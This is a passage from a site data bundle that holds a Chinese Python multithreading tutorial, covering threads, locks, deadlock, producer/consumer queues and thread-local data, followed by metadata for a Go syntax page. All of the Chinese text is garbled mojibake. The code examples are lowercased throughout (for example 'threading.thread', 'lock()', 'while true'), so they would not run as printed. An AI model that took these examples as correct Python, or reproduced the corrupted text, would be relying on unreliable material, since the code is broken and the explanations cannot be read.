time.sleep(6)\n\"\"\"\nå¼å§è¿è¡\nçº¿ç¨thread-1å¼å§è¿è¡fun1\nçº¿ç¨thread-2å¼å§è¿è¡fun2\nçº¿ç¨thread-2è¿è¡fun2ç»æ\nçº¿ç¨thread-1è¿è¡fun1ç»æ\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nä»è¾åºç»æå¯ä»¥çåºï¼ç±äºæ¯ä¸ªçº¿ç¨å½æ°çä¼ç æ¶é´å¯è½é½ä¸ç¸åï¼æä»¥éæºè¾åºäºè¿ä¸ªç»æï¼æ¯æ¬¡è¿è¡ç¨åºï¼è¾åºçç»ææ¯ä¸ä¸æ ·çã\n\n\n# threadingæ¨¡å\n\npython3 éè¿ä¸¤ä¸ªæ ååº _thread å threading æä¾å¯¹çº¿ç¨çæ¯æã_thread æä¾äºä½çº§å«çãåå§ççº¿ç¨ä»¥åä¸ä¸ªç®åçéï¼å®ç¸æ¯äº threading æ¨¡åçåè½è¿æ¯æ¯è¾æéçã\n\nthreading æ¨¡åé¤äºåå«_thread æ¨¡åä¸­çæææ¹æ³å¤ï¼è¿æä¾çå¶ä»æ¹æ³ï¼\n\n * threading.currentthread(): è¿åå½åççº¿ç¨åéã\n * threading.enumerate(): è¿åä¸ä¸ªåå«æ­£å¨è¿è¡ççº¿ç¨çlistãæ­£å¨è¿è¡æçº¿ç¨å¯å¨åãç»æåï¼ä¸åæ¬å¯å¨ååç»æ­¢åççº¿ç¨ã\n * threading.activecount(): è¿åæ­£å¨è¿è¡ççº¿ç¨æ°éï¼ä¸len(threading.enumerate())æç¸åçç»æã\n\nå¨python3ç¨åºä¸­ï¼å¯¹å¤çº¿ç¨æ¯ææå¥½çæ¯threadingæ¨¡åï¼ä½¿ç¨è¿ä¸ªæ¨¡åï¼å¯ä»¥çµæ´»å°åå»ºå¤çº¿ç¨ç¨åºï¼å¹¶ä¸å¯ä»¥å¨å¤çº¿ç¨ä¹é´è¿è¡åæ­¥åéä¿¡ãå¨python3ç¨åºä¸­ï¼å¯ä»¥éè¿å¦ä¸ä¸¤ç§æ¹å¼æ¥åå»ºçº¿ç¨ï¼\n\n * éè¿threading.threadç´æ¥å¨çº¿ç¨ä¸­è¿è¡å½æ°\n * éè¿ç»§æ¿ç±»threading.threadæ¥åå»ºçº¿ç¨\n\nå¨pythonä¸­ä½¿ç¨threading.threadçåºæ¬è¯­æ³æ ¼å¼å¦ä¸æç¤ºï¼\n\nthread(group=none, target=none, name=none, args=(), kwargs={})\n\n\n1\n\n\nthreadç±»çæåæ¹æ³ï¼\n\næ¹æ³å            æè¿°\nrun()          ç¨ä»¥è¡¨ç¤ºçº¿ç¨æ´»å¨çæ¹æ³\nstart()        å¯å¨çº¿ç¨æ´»å¨\njoin([time])   ç­å¾è³çº¿ç¨ä¸­æ­¢ãè¿é»å¡è°ç¨çº¿ç¨ç´è³çº¿ç¨çjoin() æ¹æ³è¢«è°ç¨ä¸­æ­¢-æ­£å¸¸éåºæèæåºæªå¤ççå¼å¸¸-æèæ¯å¯éçè¶æ¶åç\nisalive()      è¿åçº¿ç¨æ¯å¦æ´»å¨ç\ngetname()      è¿åçº¿ç¨å\nsetname()      è®¾ç½®çº¿ç¨å\n\nåå»ºçº¿ç¨çç¤ºä¾ä»£ç ï¼\n\nimport threading\nimport time\ndef fun1(thread_name,delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun1'.format(thread_name))\n    time.sleep(delay)\n    print('çº¿ç¨{0}è¿è¡fun1ç»æ'.format(thread_name))\ndef fun2(thread_name,delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun2'.format(thread_name))\n    time.sleep(delay)\n    print('çº¿ç¨{0}è¿è¡fun2ç»æ'.format(thread_name))\nif __name__=='__main__':\n    print('å¼å§è¿è¡')\n    #åå»ºçº¿ç¨\n    t1=threading.thread(target=fun1,args=('thread-1',2))\n    t2=threading.thread(target=fun2,args=('thread-2',4))\n    t1.start()\n    t2.start()\n\"\"\"\nå¼å§è¿è¡\nçº¿ç¨thread-1å¼å§è¿è¡fun1\nçº¿ç¨thread-2å¼å§è¿è¡fun2\nçº¿ç¨thread-1è¿è¡fun1ç»æ\nçº¿ç¨thread-2è¿è¡fun2ç»æ\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¨pythonä¸­ï¼éè¿ç»§æ¿ç±»threading.threadçæ¹å¼æ¥åå»ºä¸ä¸ªçº¿ç¨ãè¿ç§æ¹æ³åªè¦éåç±»threading.threadä¸­çæ¹æ³run()ï¼ç¶ååè°ç¨æ¹æ³start()å°±è½åå»ºçº¿ç¨ï¼å¹¶è¿è¡æ¹æ³run()ä¸­çä»£ç ã\n\nç»§æ¿threadç±»åå»ºçº¿ç¨ï¼\n\nimport threading\nimport time\ndef fun1(delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun1'.format(threading.current_thread().name))\n    time.sleep(delay)\n    print('çº¿ç¨{0}è¿è¡fun1ç»æ'.format(threading.current_thread().name))\ndef fun2(delay):\n    print('çº¿ç¨{0}å¼å§è¿è¡fun2'.format(threading.current_thread().name))\n    time.sleep(2)\n    print('çº¿ç¨{0}è¿è¡fun2ç»æ'.format(threading.current_thread().name))\n#åå»ºçº¿ç¨ç±»ç»§æ¿threading.thread\nclass mythread(threading.thread):\n    #éåç¶ç±»çæé æ¹æ³ï¼å¶ä¸­funcæ¯çº¿ç¨å½æ°ï¼argsæ¯ä¼ å¥çº¿ç¨çåæ°,nameæ¯çº¿ç¨å\n    def __init__(self,func,name,args):\n        super().__init__(target=func,name=name,args=args)\n    #éåç¶ç±»çrun()æ¹æ³\n    def run(self):\n        self._target(*self._args)\n\nif __name__=='__main__':\n    print('å¼å§è¿è¡')\n    #åå»ºçº¿ç¨\n    t1=mythread(fun1,'thread-1',(2,))\n    t2=mythread(fun2,'thread-2',(4,))\n    t1.start()\n    t2.start()\n\n\"\"\"\nå¼å§è¿è¡\nçº¿ç¨thread-1å¼å§è¿è¡fun1\nçº¿ç¨thread-2å¼å§è¿è¡fun2\nçº¿ç¨thread-1è¿è¡fun1ç»æ\nçº¿ç¨thread-2è¿è¡fun2ç»æ\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\nå¨è°ç¨threadç±»çæé æ¹æ³æ¶ï¼éè¦å°çº¿ç¨å½æ°ãåæ°ç­å¼ä¼ å¥æé æ¹æ³ï¼å¶ä¸­nameè¡¨ç¤ºçº¿ç¨çåå­ï¼å¦æä¸æå®è¿ä¸ªåæ°ï¼é»è®¤ççº¿ç¨åå­æ ¼å¼ä¸ºthread-1ãthread-2ãæ¯ä¸ä¸ªä¼ å¥æé æ¹æ³çåæ°å¼ï¼å¨threadç±»ä¸­é½æå¯¹åºçæååéä¿å­è¿äºå¼ï¼è¿äºæååéé½ä»¥ä¸åçº¿(_)å¼å¤´ï¼å¦æ_targetã_argsç­ãå¨runæ¹æ³ä¸­éè¦ä½¿ç¨è¿äºåéè°ç¨ä¼ å¥ççº¿ç¨å½æ°ï¼å¹¶ä¸ºçº¿ç¨å½æ°ä¼ éåæ°ã\n\n\n# çº¿ç¨å±äº«å¨å±åé\n\nå¨ä¸ä¸ªè¿ç¨åææçº¿ç¨å±äº«å¨å±åéï¼å¤çº¿ç¨ä¹é´çæ°æ®å±äº«æ¯å¤è¿ç¨è¦å¥½ãä½æ¯å¯è½é æå¤ä¸ªè¿ç¨åæ¶ä¿®æ¹ä¸ä¸ªåéï¼å³çº¿ç¨éå®å¨ï¼ï¼å¯è½é ææ··ä¹±ã\n\nçº¿ç¨ä¹é´çå¨å±åéå¯å±äº«ï¼\n\nimport time\nfrom threading import *\n#å®ä¹å¨å±åénum\nnum=10\ndef test1():\n    global num\n    for i in range(3):\n        num+=1\n    print('test1è¾åºnum:',num)\n\ndef test2():\n    global num\n    print('test2è¾åºnum:',num)\n\nif __name__=='__main__':\n    t1=thread(target=test1)\n    t2=thread(target=test2)\n    t1.start()\n    t1.join()\n    t2.start()\n    t2.join()\n\n\"\"\"\ntest1è¾åºnum: 13\ntest2è¾åºnum: 13\n\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\nçº¿ç¨ä¹é´çå¨å±åéå±äº«å­å¨çé®é¢ï¼\n\nimport time\nfrom threading import *\n#å®ä¹å¨å±åénum\nnum=0\ndef test1():\n    global num\n    for i in range(100000):\n        num+=1\n    print('test1è¾åºnum:',num)\n\ndef test2():\n    global num\n    for i in range(100000):\n        num+=1\n    print('test2è¾åºnum:',num)\n\nif __name__=='__main__':\n    t1=thread(target=test1)\n    t2=thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\n\"\"\"\ntest1è¾åºnum: 196538\ntest2è¾åºnum: 200000\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# é\n\n\n# äºæ¥é\n\nå¦æå¤ä¸ªçº¿ç¨å±åå¯¹æä¸ªæ°æ®ä¿®æ¹ï¼åå¯è½åºç°ä¸å¯é¢æçç»æï¼ä¸ºäºä¿è¯æ°æ®çæ­£ç¡®æ§ï¼éè¦å¯¹å¤ä¸ªçº¿ç¨è¿è¡åæ­¥ãæç®åçåæ­¥æºå¶å°±æ¯å¼å¥äºæ¥éã\n\néæä¸¤ç§ç¶æââéå®åæªéå®ãæä¸ªçº¿ç¨è¦æ´æ¹å±äº«æ°æ®æ¶ï¼åå°å¶éå®ï¼æ­¤æ¶èµæºçç¶æä¸ºâéå®âï¼å¶ä»çº¿ç¨ä¸è½æ´æ¹ï¼ç´å°è¯¥çº¿ç¨éæ¾èµæºï¼å°èµæºçç¶æåæâééå®âç¶æï¼å¶ä»ççº¿ç¨æè½åæ¬¡éå®è¯¥èµæºãäºæ¥éä¿è¯äºæ¯æ¬¡åªæä¸ä¸ªçº¿ç¨è¿è¡åå¥æä½ï¼ä»èä¿è¯äºå¤çº¿ç¨æåµä¸æ°æ®çæ­£ç¡®æ§ã\n\nä½¿ç¨ thread å¯¹è±¡ç lock å¯ä»¥å®ç°ç®åççº¿ç¨åæ­¥ï¼æä¸é acquire æ¹æ³å éæ¾release æ¹æ³ï¼å¯¹äºé£äºéè¦æ¯æ¬¡åªåè®¸ä¸ä¸ªçº¿ç¨æä½çæ°æ®ï¼å¯ä»¥å°å¶æä½æ¾å° acquire å release æ¹æ³ä¹é´ã\n\näºæ¥éçç¤ºä¾ä»£ç ï¼\n\nimport time\nfrom threading import thread,lock\n#å®ä¹å¨å±åénum\nnum=0\n#åå»ºä¸æäºæ¥é\nmutex=lock()\ndef test1():\n    global num\n    '''\n    å¨ä¸¤ä¸ªçº¿ç¨ä¸­é½è°ç¨ä¸éçæ¹æ³ï¼åè¿ä¸¤ä¸ªçº¿ç¨å°±ä¼æ¢çä¸éï¼\n    å¦ææ1æ¹æåä¸éï¼é£ä¹å¯¼è´å¦å¤ä¸æ¹ä¼å µå¡ï¼ä¸ç´ç­å¾ï¼ç´å°è¿ä¸ªéè¢«è§£å¼\n    '''\n    mutex.acquire()#ä¸é\n    for i in range(100000):\n        num+=1\n    mutex.release()\n    print('test1è¾åºnum:',num)\n\ndef test2():\n    global num\n    mutex.acquire()  # ä¸é\n    for i in range(100000):\n        num+=1\n    mutex.release()\n    print('test2è¾åºnum:',num)\n\nif __name__=='__main__':\n    t1=thread(target=test1)\n    t2=thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\n\"\"\"\ntest1è¾åºnum: 100000\ntest2è¾åºnum: 200000\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\näºæ¥éçé®é¢ä¼åï¼\n\nimport time\nfrom threading import thread,lock\n#å®ä¹å¨å±åénum\nnum=0\n#åå»ºä¸æäºæ¥é\nmutex=lock()\ndef test1():\n    global num\n    '''\n    å¨ä¸¤ä¸ªçº¿ç¨ä¸­é½è°ç¨ä¸éçæ¹æ³ï¼åè¿ä¸¤ä¸ªçº¿ç¨å°±ä¼æ¢çä¸éï¼\n    å¦ææ1æ¹æåä¸éï¼é£ä¹å¯¼è´å¦å¤ä¸æ¹ä¼å µå¡ï¼ä¸ç´ç­å¾ï¼ç´å°è¿ä¸ªéè¢«è§£å¼\n    '''\n    for i in range(100000):\n        mutex.acquire()  # ä¸é\n        num+=1\n        mutex.release()\n    print('test1è¾åºnum:',num)\n\ndef test2():\n    global num\n    for i in range(100000):\n        mutex.acquire()  # ä¸é\n        num+=1\n        mutex.release()\n    print('test2è¾åºnum:',num)\n\nif __name__=='__main__':\n    t1=thread(target=test1)\n    t2=thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\"\"\"\ntest1è¾åºnum: 169163\ntest2è¾åºnum: 200000\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# æ­»é\n\nå¨çº¿ç¨å±äº«å¤ä¸ªèµæºçæ¶åï¼å¦æä¸¤ä¸ªçº¿ç¨åå«å æä¸é¨åèµæºå¹¶ä¸åæ¶ç­å¾å¯¹æ¹çèµæºï¼å°±ä¼é ææ­»éã\n\nimport time\nfrom threading import thread,lock\nimport threading\nmutexa=threading.lock()\nmutexb=threading.lock()\nclass mythread1(thread):\n    def run(self):\n        if mutexa.acquire():\n            print(self.name,'æ§è¡')\n            time.sleep(1)\n            if mutexb.acquire():\n                print(self.name,'æ§è¡')\n                mutexb.release()\n            mutexa.release()\n\n\nclass mythread2(thread):\n    def run(self):\n        if mutexb.acquire():\n            print(self.name,'æ§è¡')\n            time.sleep(1)\n            if mutexa.acquire():\n                print(self.name,'æ§è¡')\n                mutexa.release()\n            mutexb.release()\n\nif __name__ == '__main__':\n    t1=mythread1()\n    t2=mythread2()\n    t1.start()\n    t2.start()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n\n\n# çº¿ç¨åæ­¥\n\nåæ­¥å°±æ¯ååæ­¥è°ï¼æé¢å®çååæ¬¡åºè¿è¡è¿è¡ãä¾å¦ï¼å¼ä¼ãâåâå­æååãåå©ãäºç¸éåã\n\nå¦è¿ç¨ãçº¿ç¨åæ­¥ï¼å¯ä»¥çè§£ä¸ºè¿ç¨æçº¿ç¨aåbä¸åéåï¼aæ§è¡å°ä¸å®ç¨åº¦æ¶è¦ä¾é bçæä¸ªç»æï¼äºæ¯åä¸æ¥ï¼ç¤ºæbè¿è¡ï¼bè¿è¡åå°ç»æç»aï¼aç»§ç»­è¿è¡ã\n\nimport time\nfrom threading import thread,lock\nimport threading\nlock1=lock()\nlock2=lock()\nlock3=lock()\nlock2.acquire()\nlock3.acquire()\nclass task1(thread):\n    def run(self):\n        while true:\n            if lock1.acquire():\n                print('...task1...')\n                time.sleep(1)\n                lock2.release()\n\nclass task2(thread):\n    def run(self):\n        while true:\n            if lock2.acquire():\n                print('...task2...')\n                time.sleep(1)\n                lock3.release()\n\nclass task3(thread):\n    def run(self):\n        while true:\n            if lock3.acquire():\n                print('...task3...')\n                time.sleep(1)\n                lock1.release()\n\nif __name__ == '__main__':\n    t1=task1()\n    t2=task2()\n    t3=task3()\n    t1.start()\n    t2.start()\n    t3.start()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# çäº§èåæ¶è´¹èæ¨¡å¼\n\nçäº§èå°±æ¯çäº§æ°æ®ççº¿ç¨ï¼æ¶è´¹èå°±æ¯æ¶è´¹æ°æ®ççº¿ç¨ãå¨å¤çº¿ç¨å¼åå½ä¸­ï¼å¦æçäº§èå¤çéåº¦å¾å¿«ï¼èæ¶è´¹èå¤çéåº¦å¾æ¢ï¼é£ä¹çäº§èå°±å¿é¡»ç­å¾æ¶è´¹èå¤çå®ï¼æè½ç»§ç»­çäº§æ°æ®ãåæ ·çéçï¼å¦ææ¶è´¹èçå¤çè½åå¤§äºçäº§èï¼é£ä¹æ¶è´¹èå°±å¿é¡»ç­å¾çäº§èãä¸ºäºè§£å³è¿ä¸ªé®é¢äºæ¯å¼å¥çäº§èåæ¶è´¹èæ¨¡å¼\n\nçäº§èæ¶è´¹èæ¨¡å¼éè¿ä¸ä¸ªå®¹å¨æ¥è§£å³çäº§èåæ¶è´¹èçå¼ºè¦åé®é¢ãçäº§èåæ¶è´¹èä¹é´ä¸ç´æ¥éä¿¡ãçäº§èçäº§ååï¼ç¶åå°å¶æ¾å°ç±»ä¼¼éåçæ°æ®ç»æä¸­ï¼æ¶è´¹èä¸æ¾çäº§èè¦æ°æ®ï¼èæ¯ç´æ¥ä»éåä¸­åãè¿éä½¿ç¨queueæ¨¡åæ¥æä¾çº¿ç¨é´éä¿¡çæºå¶ï¼ä¹å°±æ¯è¯´ï¼çäº§èåæ¶è´¹èå±äº«ä¸ä¸ªéåãçäº§èçäº§åååï¼ä¼å°ååæ·»å å°éåä¸­ãæ¶è´¹èæ¶è´¹ååï¼ä¼ä»éåä¸­ååºååã\n\nçäº§èåæ¶è´¹èæ¨¡åç¤ºä¾ä»£ç ï¼\n\nimport time\nimport threading\nfrom queue import queue\nclass producer(threading.thread):\n    def run(self):\n        global queue\n        count=0\n        while true:\n            if queue.qsize()<1000:\n                for i in range(100):\n                    count += 1\n                    msg = 'çæäº§å' + str(count)\n                    queue.put(msg)\n                    print(msg)\n            time.sleep(0.5)\nclass consumer(threading.thread):\n    def run(self):\n        global queue\n        while true:\n            if queue.qsize()>100:\n                for i in range(3):\n                    msg=self.name+'æ¶è´¹äº'+queue.get()\n                    print(msg)\n            time.sleep(1)\nif __name__ == '__main__':\n    queue = queue()\n    p=producer()\n    p.start()\n    time.sleep(1)\n    c=consumer()\n    c.start()\n\n    \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# threadlocal\n\næä»¬ç¥éå¤çº¿ç¨ç¯å¢ä¸ï¼æ¯ä¸ä¸ªçº¿ç¨åå¯ä»¥ä½¿ç¨æå±è¿ç¨çå¨å±åéãå¦æä¸ä¸ªçº¿ç¨å¯¹å¨å±åéè¿è¡äºä¿®æ¹ï¼å°ä¼å½±åå°å¶ä»ææççº¿ç¨å¯¹å¨å±åéçè®¡ç®æä½ï¼ä»èåºç°æ°æ®æ··ä¹±ï¼å³ä¸ºèæ°æ®ãä¸ºäºé¿åå¤ä¸ªçº¿ç¨åæ¶å¯¹åéè¿è¡ä¿®æ¹ï¼å¼å¥äºçº¿ç¨åæ­¥æºå¶ï¼éè¿äºæ¥éæ¥æ§å¶å¯¹å¨å±åéçè®¿é®ãæä»¥ææ¶åçº¿ç¨ä½¿ç¨å±é¨åéæ¯å¨å±åéå¥½ï¼å ä¸ºå±é¨åéåªæçº¿ç¨èªèº«å¯ä»¥è®¿é®ï¼åä¸ä¸ªè¿ç¨ä¸çå¶ä»çº¿ç¨ä¸å¯è®¿é®ãä½æ¯å±é¨åéä¹æ¯æé®é¢ï¼å°±æ¯å¨å½æ°è°ç¨çæ¶åï¼ä¼ éèµ·æ¥å¾éº»ç¦ãç¤ºä¾å¦ä¸ï¼\n\ndef process_student(name):\n    std=student(name)\n    do_task1(std)\n    do_task2(std)\n    \ndef do_task1(std):\n    do_sub_task1(std)\n    do_sub_task2(std)\n    \ndef do_task2(std):\n    do_sub_task1(std)\n    do_sub_task2(std)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nä»ä¸é¢çå®ä¾å¯ä»¥çå°æ¯ä¸ªå½æ°ä¸å±ä¸å±è°ç¨é½éè¦ä¼ éstdåæ°ï¼éå¸¸éº»ç¦ï¼å¦æä½¿ç¨å¨å±åéä¹ä¸è¡ï¼å ä¸ºæ¯ä¸ªçº¿ç¨å¤çä¸åçstudentå¯¹è±¡ï¼ä¸è½å±äº«ãå æ­¤ python è¿æä¾äºthreadlocal åéï¼å®æ¬èº«æ¯ä¸ä¸ªå¨å±åéï¼ä½æ¯æ¯ä¸ªçº¿ç¨å´å¯ä»¥å©ç¨å®æ¥ä¿å­å±äºèªå·±çç§ææ°æ®ï¼è¿äºç§ææ°æ®å¯¹å¶ä»çº¿ç¨ä¹æ¯ä¸å¯è§çã\n\nimport threading\n# åå»ºå¨å±threadlocalå¯¹è±¡:\nlocal = threading.local()\ndef process_student():\n    # è·åå½åçº¿ç¨å³èçname:\n    student_name = local.name\n    print('çº¿ç¨åï¼%s å­¦çå§å:%s' % (threading.current_thread().name,student_name))\ndef process_thread(name):\n    # ç»å®threadlocalçname:\n    local.name = name\n    process_student()\nt1 = threading.thread(target=process_thread, args=('å¼ ä¸',), name='thread-a')\nt2 = threading.thread(target=process_thread, args=('æå',), name='thread-b')\nt1.start()\nt2.start()\nt1.join()\nt2.join()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n",charsets:{cjk:!0},lastUpdated:"2022/04/06, 13:02:34",lastUpdatedTimestamp:1649250154e3},{title:"Goè¯­è¨åºç¡è¯­æ³",frontmatter:{title:"Goè¯­è¨åºç¡è¯­æ³",date:"2022-04-07T21:00:00.000Z",permalink:"/sec/dev/go/basicgrammar",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Go"],tags:["Go"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2021.Go/00.Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95.html",relativePath:"02.å®å¨/202.å®å¨å¼å/2021.Go/00.Goè¯­è¨åºç¡è¯­æ³.md",key:"v-556cb44a",path:"/sec/dev/go/basicgrammar/",headers:[{level:2,title:"ç®ä»",slug:"ç®ä»",normalizedTitle:"ç®ä»",charIndex:15},{level:2,title:"æ°æ®ç±»å",slug:"æ°æ®ç±»å",normalizedTitle:"æ°æ®ç±»å",charIndex:366},{level:3,title:"åé",slug:"åé",normalizedTitle:"åé",charIndex:375},{level:3,title:"æ°æ®ç±»å",slug:"æ°æ®ç±»å-2",normalizedTitle:"æ°æ®ç±»å",charIndex:366},{level:3,title:"å¸¸é",slug:"å¸¸é",normalizedTitle:"å¸¸é",charIndex:4774},{level:3,title:"è¿ç®ç¬¦",slug:"è¿ç®ç¬¦",normalizedTitle:"è¿ç®ç¬¦",charIndex:5440},{level:2,title:"æµç¨æ§å¶",slug:"æµç¨æ§å¶",normalizedTitle:"æµç¨æ§å¶",charIndex:7206},{level:3,title:"åæ¯ - éæ©",slug:"åæ¯-éæ©",normalizedTitle:"åæ¯ - éæ©",charIndex:7215},{level:3,title:"å¾ªç¯",slug:"å¾ªç¯",normalizedTitle:"å¾ªç¯",charIndex:8301},{level:3,title:"è·³è½¬è¯­å¥",slug:"è·³è½¬è¯­å¥",normalizedTitle:"è·³è½¬è¯­å¥",charIndex:8814},{level:2,title:"å½æ°",slug:"å½æ°",normalizedTitle:"å½æ°",charIndex:1074},{level:3,title:"åæ°åè¡¨",slug:"åæ°åè¡¨",normalizedTitle:"åæ°åè¡¨",charIndex:9952},{level:3,title:"å½æ°çåµå¥è°ç¨",slug:"å½æ°çåµå¥è°ç¨",normalizedTitle:"å½æ°çåµå¥è°ç¨",charIndex:10847},{level:3,title:"å½æ°è¿åå¼",slug:"å½æ°è¿åå¼",normalizedTitle:"å½æ°è¿åå¼",charIndex:11326},{level:3,title:"å½æ°ç±»å",slug:"å½æ°ç±»å",normalizedTitle:"å½æ°ç±»å",charIndex:12433},{level:3,title:"ä½ç¨å",slug:"ä½ç¨å",normalizedTitle:"ä½ç¨å",charIndex:12736},{level:3,title:"å¿åå½æ°",slug:"å¿åå½æ°",normalizedTitle:"å¿åå½æ°",charIndex:13262},{level:3,title:"éå½å½æ°",slug:"éå½å½æ°",normalizedTitle:"éå½å½æ°",charIndex:13693},{level:2,title:"å·¥ç¨",slug:"å·¥ç¨",normalizedTitle:"å·¥ç¨",charIndex:13989},{level:2,title:"æ°æ®æ ¼å¼",slug:"æ°æ®æ ¼å¼",normalizedTitle:"æ°æ®æ ¼å¼",charIndex:13996},{level:3,title:"æ°ç»",slug:"æ°ç»",normalizedTitle:"æ°ç»",charIndex:3122},{level:3,title:"åç",slug:"åç",normalizedTitle:"åç",charIndex:4071},{level:3,title:"å­ç¬¦ä¸²",slug:"å­ç¬¦ä¸²",normalizedTitle:"å­ç¬¦ä¸²",charIndex:2364},{level:3,title:"å­å¸Map",slug:"å­å¸map",normalizedTitle:"å­å¸map",charIndex:14027},{level:3,title:"ç»æä½struct",slug:"ç»æä½struct",normalizedTitle:"ç»æä½struct",charIndex:14037},{level:3,title:"æé",slug:"æé",normalizedTitle:"æé",charIndex:7048},{level:2,title:"é¢åå¯¹è±¡",slug:"é¢åå¯¹è±¡",normalizedTitle:"é¢åå¯¹è±¡",charIndex:12710},{level:2,title:"å¼å¸¸",slug:"å¼å¸¸",normalizedTitle:"å¼å¸¸",charIndex:14067},{level:2,title:"ææ¬å¤ç",slug:"ææ¬å¤ç",normalizedTitle:"ææ¬å¤ç",charIndex:14074}],excerpt:'<h1 id="goè¯­è¨åºç¡è¯­æ³"><a class="header-anchor" href="#goè¯­è¨åºç¡è¯­æ³">#</a> Goè¯­è¨åºç¡è¯­æ³</h1>\n<h2 id="ç®ä»"><a class="header-anchor" href="#ç®ä»">#</a> ç®ä»</h2>\n<p>Goè¯­è¨æ¯ä¸ç§ç±»Cçè¯­è¨ï¼æ§è¡æçè¾é«ï¼å¨å®å¨æ¹é¢æ¯è¾éåç¨æ¥ç¼åæ«æå¨ãæ«æéåº¦ä¼æ¯Pythonå¿«ä¸å°ãåæ¶å¦æGoè¯­è¨ä¹å¯ä»¥ç¨æ¥å¼åæå¡å¨ï¼å¨é«å¹¶åçåºæ¯ä¸éåºè½åæ¯è¾å¥½ãæä»¥ä»å®å¨æ¹é¢æ¥è¯´ï¼Goè¯­è¨å¼çå­¦ä¹ ï¼ä¸æ¹é¢æ¯å¼åä¸äºå·¥å·ï¼å¦ä¸æ¹é¢ï¼å¦æéå°GOè¯­è¨å¼åçé¡¹ç®ï¼ä¹å¯ä»¥è¿è¡ç¸å³çä»£ç å®¡è®¡ã</p>\n',headersStr:"ç®ä» æ°æ®ç±»å åé æ°æ®ç±»å å¸¸é è¿ç®ç¬¦ æµç¨æ§å¶ åæ¯ - éæ© å¾ªç¯ è·³è½¬è¯­å¥ å½æ° åæ°åè¡¨ å½æ°çåµå¥è°ç¨ å½æ°è¿åå¼ å½æ°ç±»å ä½ç¨å å¿åå½æ° éå½å½æ° å·¥ç¨ æ°æ®æ ¼å¼ æ°ç» åç å­ç¬¦ä¸² å­å¸Map ç»æä½struct æé é¢åå¯¹è±¡ å¼å¸¸ ææ¬å¤ç",content:'# Goè¯­è¨åºç¡è¯­æ³\n\n\n# ç®ä»\n\nGoè¯­è¨æ¯ä¸ç§ç±»Cçè¯­è¨ï¼æ§è¡æçè¾é«ï¼å¨å®å¨æ¹é¢æ¯è¾éåç¨æ¥ç¼åæ«æå¨ãæ«æéåº¦ä¼æ¯Pythonå¿«ä¸å°ãåæ¶å¦æGoè¯­è¨ä¹å¯ä»¥ç¨æ¥å¼åæå¡å¨ï¼å¨é«å¹¶åçåºæ¯ä¸éåºè½åæ¯è¾å¥½ãæä»¥ä»å®å¨æ¹é¢æ¥è¯´ï¼Goè¯­è¨å¼çå­¦ä¹ ï¼ä¸æ¹é¢æ¯å¼åä¸äºå·¥å·ï¼å¦ä¸æ¹é¢ï¼å¦æéå°GOè¯­è¨å¼åçé¡¹ç®ï¼ä¹å¯ä»¥è¿è¡ç¸å³çä»£ç å®¡è®¡ã\n\næ³¨éï¼ä»æç®åçæ³¨éå¼å§è¯´èµ·ï¼Goè¯­è¨ä¸­çæ³¨éåJavaè¯­è¨ãCè¯­è¨ä¸æ ·ãé¤äºæ²¡æJavaè¯­è¨ä¸­çææ¡£æ³¨éãå¦ä¸æç¤ºï¼\n\npackage main\n\nimport "fmt"\n\nfunc main() {\n  // åè¡æ³¨é\n  /*\n\t\tå¤è¡æ³¨é\n\t*/\n  fmt.Println("hello world")\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# æ°æ®ç±»å\n\n\n# 